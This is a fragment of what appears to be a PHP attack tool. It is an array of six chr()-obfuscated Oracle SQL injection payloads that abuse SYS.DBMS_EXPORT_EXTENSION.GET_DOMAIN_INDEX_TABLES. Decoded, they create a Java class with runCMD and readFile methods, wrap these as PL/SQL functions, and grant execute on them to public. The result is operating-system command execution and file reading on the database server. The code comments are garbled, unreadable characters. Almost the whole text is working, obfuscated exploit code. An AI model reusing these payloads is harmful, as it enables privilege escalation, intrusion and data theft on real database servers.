chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(102)||chr(105)||chr(108)||chr(101)||chr(110)||chr(97)||chr(109)||chr(101)||chr(46)||chr(115)||chr(116)||chr(97)||chr(114)||chr(116)||chr(115)||chr(87)||chr(105)||chr(116)||chr(104)||chr(40)||chr(34)||chr(104)||chr(116)||chr(116)||chr(112)||chr(34)||chr(41)||chr(63)||chr(110)||chr(101)||chr(119)||chr(32)||chr(73)||chr(110)||chr(112)||chr(117)||chr(116)||chr(83)||chr(116)||chr(114)||chr(101)||chr(97)||chr(109)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(110)||chr(101)||chr(119)||chr(32)||chr(85)||chr(82)||chr(76)||chr(40)||chr(102)||chr(105)||chr(108)||chr(101)||chr(110)||chr(97)||chr(109)||chr(101)||chr(41)||chr(46)||chr(111)||chr(112)||chr(101)||chr(110)||chr(83)||chr(116)||chr(114)||chr(101)||
chr(97)||chr(109)||chr(40)||chr(41)||chr(41)||chr(58)||chr(110)||chr(101)||chr(119)||chr(32)||chr(70)||chr(105)||chr(108)||chr(101)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(102)||chr(105)||chr(108)||chr(101)||chr(110)||chr(97)||chr(109)||chr(101)||chr(41)||chr(41)||chr(59)||chr(13)||chr(10)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(44)||chr(115)||chr(116)||chr(114)||chr(61)||chr(34)||chr(34)||chr(59)||chr(119)||chr(104)||chr(105)||chr(108)||chr(101)||chr(32)||chr(40)||chr(40)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(32)||chr(61)||chr(32)||chr(109)||
chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(46)||chr(114)||chr(101)||chr(97)||chr(100)||chr(76)||chr(105)||chr(110)||chr(101)||chr(40)||chr(41)||chr(41)||chr(32)||chr(33)||chr(61)||chr(32)||chr(110)||chr(117)||chr(108)||chr(108)||chr(41)||chr(32)||chr(115)||chr(116)||chr(114)||chr(32)||chr(43)||chr(61)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(43)||chr(34)||chr(92)||chr(110)||chr(34)||chr(59)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(46)||chr(99)||chr(108)||chr(111)||
chr(115)||chr(101)||chr(40)||chr(41)||chr(59)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(115)||chr(116)||chr(114)||chr(59)||chr(125)||chr(32)||chr(99)||chr(97)||chr(116)||chr(99)||chr(104)||chr(32)||chr(40)||chr(69)||chr(120)||chr(99)||chr(101)||chr(112)||chr(116)||chr(105)||chr(111)||chr(110)||chr(32)||chr(101)||chr(41)||chr(123)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(101)||chr(46)||chr(116)||chr(111)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(40)||chr(41)||chr(59)||chr(125)||chr(125)||chr(13)||chr(10)||chr(125)||chr(39)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45),chr(83)||chr(89)||chr(83),0,chr(49),0) from all_tables where rownum=1",	



//2.��JavaȨ�� 2
"select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(68)||chr(69)||chr(67)||chr(76)||chr(65)||chr(82)||chr(69)||chr(32)||chr(80)||chr(82)||chr(65)||chr(71)||chr(77)||chr(65)||chr(32)||chr(65)||chr(85)||chr(84)||chr(79)||chr(78)||chr(79)||chr(77)||chr(79)||chr(85)||
chr(83)||chr(95)||chr(84)||chr(82)||chr(65)||chr(78)||chr(83)||chr(65)||chr(67)||chr(84)||chr(73)||chr(79)||chr(78)||chr(59)||chr(66)||chr(69)||chr(71)||chr(73)||chr(78)||chr(32)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(39)||chr(32)||chr(32)||chr(13)||chr(10)||chr(99)||chr(114)||chr(101)||chr(97)||chr(116)||chr(101)||chr(32)||chr(111)||chr(114)||chr(32)||chr(114)||chr(101)||chr(112)||chr(108)||chr(97)||chr(99)||chr(101)||chr(32)||chr(97)||chr(110)||chr(100)||chr(32)||chr(99)||chr(111)||chr(109)||chr(112)||chr(105)||chr(108)||chr(101)||chr(32)||chr(106)||
chr(97)||chr(118)||chr(97)||chr(32)||chr(115)||chr(111)||chr(117)||chr(114)||chr(99)||chr(101)||chr(32)||chr(110)||chr(97)||chr(109)||chr(101)||chr(100)||chr(32)||chr(34)||chr(76)||chr(105)||chr(110)||chr(120)||chr(85)||chr(116)||chr(105)||chr(108)||chr(34)||chr(32)||chr(97)||chr(115)||chr(32)||chr(105)||chr(109)||chr(112)||chr(111)||chr(114)||chr(116)||chr(32)||chr(106)||chr(97)||chr(118)||chr(97)||chr(46)||chr(105)||chr(111)||chr(46)||chr(42)||chr(59)||chr(105)||chr(109)||chr(112)||chr(111)||chr(114)||chr(116)||chr(32)||chr(106)||chr(97)||chr(118)||chr(97)||chr(46)||chr(110)||chr(101)||chr(116)||chr(46)||chr(85)||chr(82)||chr(76)||chr(59)||chr(32)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||
chr(99)||chr(32)||chr(99)||chr(108)||chr(97)||chr(115)||chr(115)||chr(32)||chr(76)||chr(105)||chr(110)||chr(120)||chr(85)||chr(116)||chr(105)||chr(108)||chr(32)||chr(101)||chr(120)||chr(116)||chr(101)||chr(110)||chr(100)||chr(115)||chr(32)||chr(79)||chr(98)||chr(106)||chr(101)||chr(99)||chr(116)||chr(32)||chr(123)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99)||chr(32)||chr(115)||chr(116)||chr(97)||chr(116)||chr(105)||chr(99)||chr(32)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(114)||chr(117)||chr(110)||chr(67)||chr(77)||chr(68)||chr(40)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(97)||chr(114)||chr(103)||chr(115)||chr(41)||chr(32)||chr(123)||chr(116)||chr(114)||chr(121)||chr(123)||chr(66)||chr(117)||chr(102)||chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(32)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(61)||chr(32)||chr(110)||chr(101)||chr(119)||chr(32)||chr(66)||chr(117)||chr(102)||chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(13)||chr(10)||chr(110)||chr(101)||chr(119)||chr(32)||chr(73)||chr(110)||chr(112)||chr(117)||chr(116)||
chr(83)||chr(116)||chr(114)||chr(101)||chr(97)||chr(109)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(32)||chr(82)||chr(117)||chr(110)||chr(116)||chr(105)||chr(109)||chr(101)||chr(46)||chr(103)||chr(101)||chr(116)||chr(82)||chr(117)||chr(110)||chr(116)||chr(105)||
chr(109)||chr(101)||chr(40)||chr(41)||chr(46)||chr(101)||chr(120)||chr(101)||chr(99)||chr(40)||chr(97)||chr(114)||chr(103)||chr(115)||chr(41)||chr(46)||chr(103)||chr(101)||chr(116)||chr(73)||chr(110)||chr(112)||chr(117)||chr(116)||chr(83)||chr(116)||chr(114)||chr(101)||chr(97)||chr(109)||chr(40)||chr(41)||chr(32)||chr(41)||chr(32)||chr(41)||chr(59)||chr(32)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(44)||chr(115)||chr(116)||chr(114)||chr(61)||chr(34)||chr(34)||chr(59)||
chr(119)||chr(104)||chr(105)||chr(108)||chr(101)||chr(32)||chr(40)||chr(40)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(32)||chr(61)||chr(32)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(46)||chr(114)||chr(101)||chr(97)||chr(100)||chr(76)||chr(105)||chr(110)||chr(101)||chr(40)||chr(41)||chr(41)||chr(32)||chr(33)||chr(61)||chr(32)||chr(110)||chr(117)||chr(108)||chr(108)||chr(41)||chr(32)||chr(115)||chr(116)||chr(114)||chr(32)||chr(43)||chr(61)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(43)||chr(34)||chr(92)||chr(110)||chr(34)||chr(59)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(46)||chr(99)||chr(108)||chr(111)||chr(115)||chr(101)||chr(40)||chr(41)||chr(59)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(115)||chr(116)
||chr(114)||chr(59)||chr(125)||chr(32)||chr(99)||chr(97)||chr(116)||chr(99)||chr(104)||chr(32)||chr(40)||chr(69)||chr(120)||chr(99)||chr(101)||chr(112)||chr(116)||chr(105)||chr(111)||chr(110)||chr(32)||chr(101)||chr(41)||chr(123)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(101)||chr(46)||chr(116)||chr(111)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(40)||chr(41)||chr(59)||chr(125)||chr(125)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99)||chr(32)||chr(115)||chr(116)||chr(97)||chr(116)||chr(105)||chr(99)||chr(32)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(114)||chr(101)||chr(97)||chr(100)||chr(70)||chr(105)||chr(108)||chr(101)||chr(40)||chr(83)||chr(116)||chr(114)||chr(105)||
chr(110)||chr(103)||chr(32)||chr(102)||chr(105)||chr(108)||chr(101)||chr(110)||chr(97)||chr(109)||chr(101)||chr(41)||chr(123)||chr(116)||chr(114)||chr(121)||chr(123)||chr(66)||chr(117)||chr(102)||chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(32)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(61)||chr(32)||chr(110)||chr(101)||chr(119)||chr(32)||chr(66)||chr(117)||chr(102)||chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||chr(97)||
chr(100)||chr(101)||chr(114)||chr(40)||chr(102)||chr(105)||chr(108)||chr(101)||chr(110)||chr(97)||chr(109)||chr(101)||chr(46)||chr(115)||chr(116)||chr(97)||chr(114)||chr(116)||chr(115)||chr(87)||chr(105)||chr(116)||chr(104)||chr(40)||chr(34)||chr(104)||chr(116)||chr(116)||chr(112)||chr(34)||chr(41)||chr(63)||chr(110)||chr(101)||chr(119)||chr(32)||chr(73)||chr(110)||chr(112)||chr(117)||chr(116)||chr(83)||chr(116)||chr(114)||chr(101)||chr(97)||chr(109)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(110)||chr(101)||chr(119)||chr(32)||chr(85)||chr(82)||chr(76)||chr(40)||chr(102)||chr(105)||chr(108)||chr(101)||chr(110)||chr(97)||chr(109)||chr(101)||chr(41)||chr(46)||chr(111)||chr(112)||chr(101)||chr(110)||chr(83)||chr(116)||chr(114)||chr(101)||
chr(97)||chr(109)||chr(40)||chr(41)||chr(41)||chr(58)||chr(110)||chr(101)||chr(119)||chr(32)||chr(70)||chr(105)||chr(108)||chr(101)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(102)||chr(105)||chr(108)||chr(101)||chr(110)||chr(97)||chr(109)||chr(101)||chr(41)||chr(41)||chr(59)||chr(13)||chr(10)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(44)||chr(115)||chr(116)||chr(114)||chr(61)||chr(34)||chr(34)||chr(59)||chr(119)||chr(104)||chr(105)||chr(108)||chr(101)||chr(32)||chr(40)||chr(40)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(32)||chr(61)||chr(32)||chr(109)||
chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(46)||chr(114)||chr(101)||chr(97)||chr(100)||chr(76)||chr(105)||chr(110)||chr(101)||chr(40)||chr(41)||
chr(41)||chr(32)||chr(33)||chr(61)||chr(32)||chr(110)||chr(117)||chr(108)||chr(108)||chr(41)||chr(32)||chr(115)||chr(116)||chr(114)||chr(32)||chr(43)||chr(61)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(43)||chr(34)||chr(92)||chr(110)||chr(34)||chr(59)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(46)||chr(99)||chr(108)||chr(111)||chr(115)||chr(101)||chr(40)||chr(41)||chr(59)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(115)||chr(116)||chr(114)||chr(59)||chr(125)||chr(32)||chr(99)||
chr(97)||chr(116)||chr(99)||chr(104)||chr(32)||chr(40)||chr(69)||chr(120)||chr(99)||chr(101)||chr(112)||chr(116)||chr(105)||chr(111)||chr(110)||chr(32)||chr(101)||chr(41)||chr(123)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(101)||chr(46)||chr(116)||chr(111)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(40)||chr(41)||chr(59)||chr(125)||chr(125)||chr(13)||chr(10)||chr(125)||chr(39)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45),chr(83)||chr(89)||chr(83),0,chr(49),0) from all_tables where rownum=1",


//3.�������� 3
"select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),
chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||
chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(68)||chr(69)||chr(67)||chr(76)||chr(65)||chr(82)||chr(69)||chr(32)||chr(80)||chr(82)||chr(65)||chr(71)||chr(77)||chr(65)||chr(32)||chr(65)||chr(85)||chr(84)||chr(79)||chr(78)||chr(79)||chr(77)||chr(79)||chr(85)||chr(83)||chr(95)||chr(84)||chr(82)||chr(65)||chr(78)||chr(83)||chr(65)||chr(67)||chr(84)||chr(73)||chr(79)||chr(78)||chr(59)||chr(66)||chr(69)||chr(71)||chr(73)||chr(78)||chr(32)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||
chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(39)||chr(99)||chr(114)||chr(101)||chr(97)||chr(116)||chr(101)||chr(32)||chr(111)||chr(114)||chr(32)||chr(114)||chr(101)||chr(112)||chr(108)||chr(97)||chr(99)||chr(101)||chr(32)||chr(102)||chr(117)||chr(110)||chr(99)||chr(116)||chr(105)||chr(111)||chr(110)||chr(32)||chr(76)||chr(105)||chr(110)||chr(120)||chr(82)||chr(117)||chr(110)||chr(67)||chr(77)||chr(68)||chr(40)||chr(112)||chr(95)||chr(99)||chr(109)||chr(100)||chr(32)||chr(105)||
chr(110)||chr(32)||chr(118)||chr(97)||chr(114)||chr(99)||chr(104)||chr(97)||chr(114)||chr(50)||chr(41)||chr(32)||chr(32)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(118)||chr(97)||chr(114)||chr(99)||chr(104)||chr(97)||chr(114)||chr(50)||chr(32)||chr(32)||chr(97)||chr(115)||chr(32)||chr(108)||chr(97)||chr(110)||chr(103)||chr(117)||chr(97)||chr(103)||chr(101)||chr(32)||chr(106)||chr(97)||chr(118)||chr(97)||chr(32)||chr(110)||chr(97)||chr(109)||chr(101)||chr(32)||chr(39)||chr(39)||chr(39)||chr(39)||chr(76)||chr(105)||chr(110)||chr(120)||
chr(85)||chr(116)||chr(105)||chr(108)||chr(46)||chr(114)||chr(117)||chr(110)||chr(67)||chr(77)||chr(68)||chr(40)||chr(106)||chr(97)||chr(118)||chr(97)||chr(46)||chr(108)||chr(97)||chr(110)||chr(103)||chr(46)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(41)||chr(32)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(39)||chr(39)||chr(39)||chr(39)||chr(59)||chr(39)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45),chr(83)||chr(89)||chr(83),0,chr(49),0) from all_tables where rownum=1",

//3.�������� 4
"select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(68)||chr(69)||chr(67)||chr(76)||chr(65)||chr(82)||chr(69)||
chr(32)||chr(80)||chr(82)||chr(65)||chr(71)||chr(77)||chr(65)||chr(32)||chr(65)||chr(85)||chr(84)||chr(79)||chr(78)||chr(79)||chr(77)||chr(79)||chr(85)||chr(83)||chr(95)||chr(84)||chr(82)||chr(65)||chr(78)||chr(83)||chr(65)||chr(67)||chr(84)||chr(73)||chr(79)||chr(78)||chr(59)||chr(66)||chr(69)||chr(71)||chr(73)||chr(78)||chr(32)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(39)||chr(32)||chr(32)||chr(32)||chr(32)||chr(13)||chr(10)||chr(99)||chr(114)||chr(101)||chr(97)||chr(116)||chr(101)||chr(32)||chr(111)||chr(114)||chr(32)||
chr(114)||chr(101)||chr(112)||chr(108)||chr(97)||chr(99)||chr(101)||chr(32)||chr(102)||chr(117)||chr(110)||chr(99)||chr(116)||chr(105)||chr(111)||chr(110)||chr(32)||chr(76)||chr(105)||chr(110)||chr(120)||chr(82)||chr(101)||chr(97)||chr(100)||chr(70)||chr(105)||chr(108)||chr(101)||chr(40)||chr(102)||chr(105)||chr(108)||chr(101)||chr(110)||chr(97)||chr(109)||chr(101)||chr(32)||chr(105)||chr(110)||chr(32)||chr(118)||chr(97)||chr(114)||chr(99)||chr(104)||chr(97)||chr(114)||chr(50)||chr(41)||chr(32)||chr(32)||chr(114)||chr(101)||
chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(118)||chr(97)||chr(114)||chr(99)||chr(104)||chr(97)||chr(114)||chr(50)||chr(32)||chr(32)||chr(97)||chr(115)||chr(32)||chr(108)||chr(97)||chr(110)||chr(103)||chr(117)||chr(97)||chr(103)||chr(101)||chr(32)||chr(106)||chr(97)||chr(118)||chr(97)||chr(32)||chr(110)||chr(97)||chr(109)||chr(101)||chr(32)||chr(39)||chr(39)||chr(39)||chr(39)||chr(76)||chr(105)||
chr(110)||chr(120)||chr(85)||chr(116)||chr(105)||chr(108)||chr(46)||chr(114)||chr(101)||chr(97)||chr(100)||chr(70)||chr(105)||chr(108)||chr(101)||chr(40)||chr(106)||chr(97)||chr(118)||chr(97)||chr(46)||chr(108)||chr(97)||chr(110)||chr(103)||chr(46)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(41)||chr(32)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(83)||
chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(39)||chr(39)||chr(39)||chr(39)||chr(59)||chr(32)||chr(32)||chr(32)||chr(39)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45),chr(83)||chr(89)||chr(83),0,chr(49),0) from all_tables where rownum=1",

//4.��publicִ�к�����Ȩ�� 5
"select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),
chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||
chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(68)||chr(69)||chr(67)||chr(76)||chr(65)||chr(82)||chr(69)||chr(32)||chr(80)||chr(82)||chr(65)||chr(71)||chr(77)||chr(65)||chr(32)||chr(65)||chr(85)||chr(84)||chr(79)||
chr(78)||chr(79)||chr(77)||chr(79)||chr(85)||chr(83)||chr(95)||chr(84)||chr(82)||chr(65)||chr(78)||chr(83)||chr(65)||chr(67)||chr(84)||chr(73)||chr(79)||chr(78)||chr(59)||chr(66)||chr(69)||chr(71)||chr(73)||chr(78)||chr(32)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||
chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(39)||chr(103)||chr(114)||chr(97)||chr(110)||chr(116)||chr(32)||chr(97)||chr(108)||chr(108)||chr(32)||chr(111)||chr(110)||chr(32)||chr(76)||chr(105)||
chr(110)||chr(120)||chr(82)||chr(117)||chr(110)||chr(67)||chr(77)||chr(68)||chr(32)||chr(116)||chr(111)||chr(32)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99)||chr(39)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45),chr(83)||chr(89)||chr(83),0,chr(49),0) from all_tables where rownum=1",
	

//4.��publicִ�к�����Ȩ�� 6
"select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(68)||chr(69)||chr(67)||chr(76)||chr(65)||chr(82)||chr(69)||chr(32)||chr(80)||chr(82)||chr(65)||chr(71)||chr(77)||chr(65)||chr(32)||chr(65)||chr(85)||chr(84)||chr(79)||chr(78)||chr(79)||chr(77)||chr(79)||chr(85)||
chr(83)||chr(95)||chr(84)||chr(82)||chr(65)||chr(78)||chr(83)||chr(65)||chr(67)||chr(84)||chr(73)||chr(79)||chr(78)||chr(59)||chr(66)||chr(69)||chr(71)||chr(73)||chr(78)||chr(32)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(39)||chr(103)||chr(114)||chr(97)||chr(110)||chr(116)||chr(32)||chr(97)||chr(108)||chr(108)||chr(32)||chr(111)||chr(110)||chr(32)||chr(76)||chr(105)||chr(110)||chr(120)||chr(82)||chr(101)||chr(97)||chr(100)||chr(70)||
chr(105)||chr(108)||chr(101)||chr(32)||chr(116)||chr(111)||chr(32)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99)||chr(39)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(39)||chr(59)||chr(69)||chr(78)||chr(68)||chr(59)||chr(45)||chr(45),chr(83)||chr(89)||chr(83),0,chr(49),0) from all_tables where rownum=1",
	
	
	);
}
?>

